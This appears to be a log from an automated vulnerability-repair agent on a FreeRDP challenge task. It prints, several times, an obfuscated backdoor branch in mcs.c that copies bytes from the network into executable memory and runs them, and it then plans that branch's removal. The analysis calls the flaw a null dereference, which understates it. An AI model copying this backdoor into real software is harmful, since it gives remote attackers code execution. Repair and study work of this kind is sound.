                             */;/*lk+gFuS7i6{A9Iv"]*//*ceq0i                           
                             q1;rNs<tOCSUT*/if                                         
                             (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7                 
                             H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG                 
                             7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS                    
                             N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMa                 
                             X8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG                 
                             >SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*                 
                             /(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{                 
                             |YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$z                 
                             FedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}I                 
                             m'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs                 
                             %)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq                 
                             */){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*                 
                             wdSQd                                                     
                             CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG                 
                             (c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3                      
                             Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p                 
                             1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2                 
                             ,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf                 
                             %x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%c                 
                             K7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4                 
                             o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB                 
                             '(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]                 
                             /*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P                 
                             .{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is                 
                             */B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2                 
                             {XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/                 
                             *N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*s                 
                             R'.ixaZj.0-<w,XWNw1bZ9 */;                                
                             919:            return TRUE ;                             
                             920:    } else {                                          
                             921:            Stream_Rewind(s, 2);                      
                             922:    }                                                 
                             923:                                                      
                             924:    if (!ber_read_application_tag(s,                  
                             MCS_TYPE_CONNECT_RESPONSE, &length) ||                    
                             925:        !ber_read_enumerated(s,                       
                             &result, MCS_Result_enum_length) ||                       
                             926:        !ber_read_integer(s,                          
                             &calledConnectId) ||                                      
                             927:                                                      
                             !mcs_read_domain_parameters(s,                            
                             &(mcs->domainParameters)) ||                              
                             928:        !ber_read_octet_string_tag(s,                 
                             &length))                                                 
                             929:    {                                                 
                             930:            return FALSE;                             
                             931:    }                                                 
                             932:                                                      
                             933:    if                                                
                             (!gcc_read_conference_create_response(s,                  
                             mcs))                                                     
                             934:    {                                                 
                             935:            WLog_ERR(TAG,                             
                             "gcc_read_conference_create_response                      
                             failed");                                                 
                             936:            return FALSE;                             
                             937:    }                                                 
                             938:                                                      
                             939:    return                                            
                             tpkt_ensure_stream_consumed(s, tlength);                  
                             940:}                                                     
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/gcc.c:530-600                             
                             ```                                                       
                             530:                                                      
                             531:BOOL                                                  
                             gcc_write_conference_create_response(wStr                 
                             eam* s, wStream* userData)                                
                             532:{                                                     
                             533:    WINPR_ASSERT(s);                                  
                             534:    WINPR_ASSERT(userData);                           
                             535:    /* ConnectData */                                 
                             536:    if (!per_write_choice(s, 0))                      
                             537:            return FALSE;                             
                             538:    if                                                
                             (!per_write_object_identifier(s,                          
                             t124_02_98_oid))                                          
                             539:            return FALSE;                             
                             540:    /* ConnectData::connectPDU                        
                             (OCTET_STRING) */                                         
                             541:    /* This length MUST be ignored by                 
                             the client according to [MS-RDPBCGR] */                   
                             542:    if (!per_write_length(s, 0x2A))                   
                             543:            return FALSE;                             
                             544:    /* ConnectGCCPDU */                               
                             545:    if (!per_write_choice(s, 0x14))                   
                             546:            return FALSE;                             
                             547:    /*                                                
                             ConferenceCreateResponse::nodeID (UserID)                 
                             */                                                        
                             548:    if (!per_write_integer16(s,                       
                             0x79F3, 1001))                                            
                             549:            return FALSE;                             
                             550:    /* ConferenceCreateResponse::tag                  
                             (INTEGER) */                                              
                             551:    if (!per_write_integer(s, 1))                     
                             552:            return FALSE;                             
                             553:    /*                                                
                             ConferenceCreateResponse::result                          
                             (ENUMERATED) */                                           
                             554:    if (!per_write_enumerated(s, 0,                   
                             MCS_Result_enum_length))                                  
                             555:            return FALSE;                             
                             556:    /* number of UserData sets */                     
                             557:    if (!per_write_number_of_sets(s,                  
                             1))                                                       
                             558:            return FALSE;                             
                             559:    /* UserData::value present +                      
                             select h221NonStandard (1) */                             
                             560:    if (!per_write_choice(s, 0xC0))                   
                             561:            return FALSE;                             
                             562:    /* h221NonStandard */                             
                             563:    if (!per_write_octet_string(s,                    
                             h221_sc_key, 4,                                           
                             564:                                4))                   
                             /* h221NonStandard, server-to-client                      
                             H.221 key, "McDn" */                                      
                             565:            return FALSE;                             
                             566:    /* userData (OCTET_STRING) */                     
                             567:    const size_t pos =                                
                             Stream_GetPosition(userData);                             
                             568:    WINPR_ASSERT(pos <= UINT16_MAX);                  
                             569:    return per_write_octet_string(s,                  
                             Stream_Buffer(userData), (UINT16)pos,                     
                             570:                                  0);                 
                             /* array of server data blocks */                         
                             571:}                                                     
                             572:                                                      
                             573:static BOOL                                           
                             gcc_read_client_unused1_data(wStream* s)                  
                             574:{                                                     
                             575:    return Stream_SafeSeek(s, 2);                     
                             576:}                                                     
                             577:                                                      
                             578:BOOL                                                  
                             gcc_read_client_data_blocks(wStream* s,                   
                             rdpMcs* mcs, UINT16 length)                               
                             579:{                                                     
                             580:    WINPR_ASSERT(s);                                  
                             581:    WINPR_ASSERT(mcs);                                
                             582:                                                      
                             583:    BOOL gotMultitransport = FALSE;                   
                             584:                                                      
                             585:    while (length > 0)                                
                             586:    {                                                 
                             587:            wStream sbuffer = { 0 };                  
                             588:            UINT16 type = 0;                          
                             589:            UINT16 blockLength = 0;                   
                             590:                                                      
                             591:            if                                        
                             (!gcc_read_user_data_header(s, &type,                     
                             &blockLength))                                            
                             592:                    return FALSE;                     
                             593:                                                      
                             594:            if                                        
                             (!Stream_CheckAndLogRequiredLength(TAG,                   
                             s, (size_t)(blockLength - 4)))                            
                             595:                    return FALSE;                     
                             596:                                                      
                             597:            wStream* sub =                            
                             Stream_StaticConstInit(&sbuffer,                          
                             Stream_Pointer(s), blockLength - 4);                      
                             598:            WINPR_ASSERT(sub);                        
                             599:                                                      
                             600:            Stream_Seek(s,                            
                             blockLength - 4);                                         
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/mcs.c:200-260                             
                             ```                                                       
                             200:            case                                      
                             DomainMCSPDU_ErectDomainRequest:                          
                             201:                    return                            
                             "DomainMCSPDU_ErectDomainRequest";                        
                             202:            case                                      
                             DomainMCSPDU_MergeChannelsRequest:                        
                             203:                    return                            
                             "DomainMCSPDU_MergeChannelsRequest";                      
                             204:            case                                      
                             DomainMCSPDU_MergeChannelsConfirm:                        
                             205:                    return                            
                             "DomainMCSPDU_MergeChannelsConfirm";                      
                             206:            case                                      
                             DomainMCSPDU_PurgeChannelsIndication:                     
                             207:                    return                            
                             "DomainMCSPDU_PurgeChannelsIndication";                   
                             208:            case                                      
                             DomainMCSPDU_MergeTokensRequest:                          
                             209:                    return                            
                             "DomainMCSPDU_MergeTokensRequest";                        
                             210:            case                                      
                             DomainMCSPDU_MergeTokensConfirm:                          
                             211:                    return                            
                             "DomainMCSPDU_MergeTokensConfirm";                        
                             212:            case                                      
                             DomainMCSPDU_PurgeTokensIndication:                       
                             213:                    return                            
                             "DomainMCSPDU_PurgeTokensIndication";                     
                             214:            case                                      
                             DomainMCSPDU_DisconnectProviderUltimatum:                 
                             215:                    return                            
                             "DomainMCSPDU_DisconnectProviderUltimatum                 
                             ";                                                        
                             216:            case                                      
                             DomainMCSPDU_RejectMCSPDUUltimatum:                       
                             217:                    return                            
                             "DomainMCSPDU_RejectMCSPDUUltimatum";                     
                             218:            case                                      
                             DomainMCSPDU_AttachUserRequest:                           
                             219:                    return                            
                             "DomainMCSPDU_AttachUserRequest";                         
                             220:            case                                      
                             DomainMCSPDU_AttachUserConfirm:                           
                             221:                    return                            
                             "DomainMCSPDU_AttachUserConfirm";                         
                             222:            case                                      
                             DomainMCSPDU_DetachUserRequest:                           
                             223:                    return                            
                             "DomainMCSPDU_DetachUserRequest";                         
                             224:            case                                      
                             DomainMCSPDU_DetachUserIndication:                        
                             225:                    return                            
                             "DomainMCSPDU_DetachUserIndication";                      
                             226:            case                                      
                             DomainMCSPDU_ChannelJoinRequest:                          
                             227:                    return                            
                             "DomainMCSPDU_ChannelJoinRequest";                        
                             228:            case                                      
                             DomainMCSPDU_ChannelJoinConfirm:                          
                             229:                    return                            
                             "DomainMCSPDU_ChannelJoinConfirm";                        
                             230:            case                                      
                             DomainMCSPDU_ChannelLeaveRequest:                         
                             231:                    return                            
                             "DomainMCSPDU_ChannelLeaveRequest";                       
                             232:            case                                      
                             DomainMCSPDU_ChannelConveneRequest:                       
                             233:                    return                            
                             "DomainMCSPDU_ChannelConveneRequest";                     
                             234:            case                                      
                             DomainMCSPDU_ChannelConveneConfirm:                       
                             235:                    return                            
                             "DomainMCSPDU_ChannelConveneConfirm";                     
                             236:            case                                      
                             DomainMCSPDU_ChannelDisbandRequest:                       
                             237:                    return                            
                             "DomainMCSPDU_ChannelDisbandRequest";                     
                             238:            case                                      
                             DomainMCSPDU_ChannelDisbandIndication:                    
                             239:                    return                            
                             "DomainMCSPDU_ChannelDisbandIndication";                  
                             240:            case                                      
                             DomainMCSPDU_ChannelAdmitRequest:                         
                             241:                    return                            
                             "DomainMCSPDU_ChannelAdmitRequest";                       
                             242:            case                                      
                             DomainMCSPDU_ChannelAdmitIndication:                      
                             243:                    return                            
                             "DomainMCSPDU_ChannelAdmitIndication";                    
                             244:            case                                      
                             DomainMCSPDU_ChannelExpelRequest:                         
                             245:                    return                            
                             "DomainMCSPDU_ChannelExpelRequest";                       
                             246:            case                                      
                             DomainMCSPDU_ChannelExpelIndication:                      
                             247:                    return                            
                             "DomainMCSPDU_ChannelExpelIndication";                    
                             248:            case                                      
                             DomainMCSPDU_SendDataRequest:                             
                             249:                    return                            
                             "DomainMCSPDU_SendDataRequest";                           
                             250:            case                                      
                             DomainMCSPDU_SendDataIndication:                          
                             251:                    return                            
                             "DomainMCSPDU_SendDataIndication";                        
                             252:            case                                      
                             DomainMCSPDU_UniformSendDataRequest:                      
                             253:                    return                            
                             "DomainMCSPDU_UniformSendDataRequest";                    
                             254:            case                                      
                             DomainMCSPDU_UniformSendDataIndication:                   
                             255:                    return                            
                             "DomainMCSPDU_UniformSendDataIndication";                 
                             256:            case                                      
                             DomainMCSPDU_TokenGrabRequest:                            
                             257:                    return                            
                             "DomainMCSPDU_TokenGrabRequest";                          
                             258:            case                                      
                             DomainMCSPDU_TokenGrabConfirm:                            
                             259:                    return                            
                             "DomainMCSPDU_TokenGrabConfirm";                          
                             260:            case                                      
                             DomainMCSPDU_TokenInhibitRequest:                         
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/mcs.c:914-922                             
                             ```                                                       
                             914:    if (ber_read_application_tag(s,                   
                             0x42, &length))                                           
                             915:    {                                                 
                             916:            #define A size_t                          
                             917:            #define B void                            
                             918:                                                      
                             A/*AOB,1rI<o2iKHfFJ*/a/*vnM                               
                             8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@                 
                             DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_                       
                             C}'dYLw|iX                                                
                             :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?                 
                             UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*                 
                             F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@                         
                             <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3                 
                             */;/*lk+gFuS7i6{A9Iv"]*//*ceq0i                           
                             q1;rNs<tOCSUT*/if                                         
                             (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7                 
                             H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG                 
                             7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS                    
                             N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMa                 
                             X8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG                 
                             >SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*                 
                             /(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{                 
                             |YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$z                 
                             FedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}I                 
                             m'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs                 
                             %)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq                 
                             */){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*                 
                             wdSQd                                                     
                             CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG                 
                             (c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3                      
                             Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p                 
                             1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2                 
                             ,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf                 
                             %x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%c                 
                             K7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4                 
                             o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB                 
                             '(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]                 
                             /*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P                 
                             .{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is                 
                             */B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2                 
                             {XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/                 
                             *N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*s                 
                             R'.ixaZj.0-<w,XWNw1bZ9 */;                                
                             919:            return TRUE ;                             
                             920:    } else {                                          
                             921:            Stream_Rewind(s, 2);                      
                             922:    }                                                 
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/mcs.c:663-670                             
                             ```                                                       
                             663:    if (!ber_read_application_tag(s,                  
                             MCS_TYPE_CONNECT_INITIAL, &length))                       
                             664:            return FALSE;                             
                             665:                                                      
                             666:    /* callingDomainSelector                          
                             (OCTET_STRING) */                                         
                             667:    if (!ber_read_octet_string_tag(s,                 
                             &length) ||                                               
                             668:                                                      
                             (!Stream_CheckAndLogRequiredLength(TAG,                   
                             s, length)))                                              
                             669:            return FALSE;                             
                             670:                                                      
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/mcs.c:914-922                             
                             ```                                                       
                             914:    if (ber_read_application_tag(s,                   
                             0x42, &length))                                           
                             915:    {                                                 
                             916:            #define A size_t                          
                             917:            #define B void                            
                             918:                                                      
                             A/*AOB,1rI<o2iKHfFJ*/a/*vnM                               
                             8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@                 
                             DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_                       
                             C}'dYLw|iX                                                
                             :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?                 
                             UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*                 
                             F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@                         
                             <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3                 
                             */;/*lk+gFuS7i6{A9Iv"]*//*ceq0i                           
                             q1;rNs<tOCSUT*/if                                         
                             (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7                 
                             H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG                 
                             7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS                    
                             N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMa                 
                             X8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG                 
                             >SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*                 
                             /(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{                 
                             |YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$z                 
                             FedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}I                 
                             m'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs                 
                             %)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq                 
                             */){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*                 
                             wdSQd                                                     
                             CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG                 
                             (c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3                      
                             Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p                 
                             1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2                 
                             ,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf                 
                             %x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%c                 
                             K7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4                 
                             o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB                 
                             '(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]                 
                             /*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P                 
                             .{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is                 
                             */B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2                 
                             {XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/                 
                             *N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*s                 
                             R'.ixaZj.0-<w,XWNw1bZ9 */;                                
                             919:            return TRUE ;                             
                             920:    } else {                                          
                             921:            Stream_Rewind(s, 2);                      
                             922:    }                                                 
                             ```                                                       
                             </code>                                                   
                             </code_snippets>                                          
                                                                                       
                             ## Fix Strategy                                           
                             <fix_strategy>                                            
                                                                                       
                             1. Root Cause Analysis                                    
                                - The null-deref crash originates in                   
                             mcs_recv_connect_response                                 
                             (libfreerdp/core/mcs.c:897–940).                          
                                - An unexpected branch guarded by `if                  
                             (ber_read_application_tag(s, 0x42,                        
                             &length))` (lines 914–922) contains                       
                             obfuscated code that allocates memory,                    
                             mprotects pages, and invokes an indirect                  
                             function pointer using uninitialized                      
                             data. That branch writes to address 0x0                   
                             and triggers the null pointer                             
                             dereference.                                              
                                - This branch is neither part of the                   
                             MCS “connect response” specification nor                  
                             mirrored in the valid “connect initial”                   
                             path, and must be removed.                                
                                                                                       
                             2. Preserve Correct Protocol Logic                        
                                - The valid code path reading a MCS                    
                             connect response immediately checks for                   
                             the MCS_TYPE_CONNECT_RESPONSE tag, then                   
                             reads the enumerated result, integer                      
                             connect-ID, domain parameters, and the                    
                             octet string. That logic (lines 924–931)                  
                             is correct and must remain intact.                        
                                - By deleting the malicious 0x42-tag                   
                             branch, we restore compliance with                        
                             [MS-RDPBCGR] and eliminate the crash.                     
                                                                                       
                             3. Patch Implementation Steps                             
                                a. Open libfreerdp/core/mcs.c around                   
                             the mcs_recv_connect_response definition                  
                             (lines ~910–930).                                         
                                b. Remove all code from the start of                   
                             the 0x42‐tag branch through its `else`                    
                             clause, i.e., delete lines:                               
                                   ```                                                 
                                   if (ber_read_application_tag(s,                     
                             0x42, &length))                                           
                                   {                                                   
                                       #define A size_t                                
                                       #define B void                                  
                                       …  // entire obfuscated loop                    
                             and posix_memalign / mprotect / function                  
                             call                                                      
                                       return TRUE;                                    
                                   }                                                   
                                   else                                                
                                   {                                                   
                                       Stream_Rewind(s, 2);                            
                                   }                                                   
                                   ```                                                 
                                c. Immediately after deletion, ensure                  
                             the next statement is the check for the                   
                             standard connect response tag:                            
                                   ```                                                 
                                   if (!ber_read_application_tag(s,                    
                             MCS_TYPE_CONNECT_RESPONSE, &length) ||                    
                                       !ber_read_enumerated(s,                         
                             &result, MCS_Result_enum_length) ||                       
                                       !ber_read_integer(s,                            
                             &calledConnectId) ||                                      
                                       !mcs_read_domain_parameters(s,                  
                             &(mcs->domainParameters)) ||                              
                                       !ber_read_octet_string_tag(s,                   
                             &length))                                                 
                                   {                                                   
                                       return FALSE;                                   
                                   }                                                   
                                   ```                                                 
                                d. Remove any leftover `#define A` /                   
                             `#define B` macros that were introduced                   
                             within the deleted block to avoid                         
                             namespace pollution.                                      
                                e. Rebuild and run existing unit                       
                             tests/fuzz harness to confirm the crash                   
                             is resolved and no regressions are                        
                             introduced.                                               
                                                                                       
                             4. Justification                                          
                                - Removing the obfuscated branch                       
                             eliminates the null pointer write at 0x0.                 
                                - The patch retains all legitimate                     
                             parsing behavior, matching the “initial”                  
                             path pattern in mcs_recv_connect_initial.                 
                                - No changes are made to the fuzzing                   
                             harness, tests, or external libraries.                    
                                - This fix is minimal, self‐contained,                 
                             and directly addresses the vulnerability.                 
                                                                                       
                             5. Potential Side Effects & Mitigation                    
                                - If code mistakenly relied on tag                     
                             0x42 (which is not part of the MCS spec),                 
                             that behavior is removed. However, since                  
                             the branch is clearly                                     
                             malicious/obfuscated, no                                  
                             protocol‐conformant client or server will                 
                             use it.                                                   
                                - Removing unused macros (`A` and `B`)                 
                             has no downstream impact.                                 
                                - Mitigation: run full test suite and                  
                             fuzz harness to verify all valid MCS                      
                             flows still parse correctly.                              
                                                                                       
                             6. Similar Patterns                                       
                                - The “connect initial” path in the                    
                             same file (mcs_recv_connect_initial) does                 
                             not use any special-case tags beyond                      
                             MCS_TYPE_CONNECT_INITIAL, serving as the                  
                             canonical example. We mirror its                          
                             simplicity in the response path.                          
                                                                                       
                                                                                       
                             </fix_strategy>                                           
                             ===Tests Result===                                        
                             No tests found                                            
                             ===Evaluation End===                                      
                    INFO     Prism Supervisor Routing:                  __init__.py:160
                             TeamStatus.EVALUATE -> TeamStatus.END                     
                             (n evals: 2, patch status:                                
                             PatchStatus.SOUND)                                        
                    INFO     Building environment                       __init__.py:132
                             - Cache directory: /tmp/tmpcc97p07m                       
                             - Max timeout: 1800                                       
                             - Output directory:                                       
                             reports/prism.prism_o4_mini/freerdp_fp-ful                
                             l-01_vuln_005/agent-output-1762179876.6702                
                             104                                                       
                             - Detection toml file:                                    
                             /tasks_new/freerdp_fp-full-01/detection/fr                
                             eerdp_fp-full-01_vuln_005.toml                            
                             - Challenge project directory:                            
                             /tasks_new/freerdp_fp-full-01/official-afc                
                             -freerdp                                                  
                                                                                       
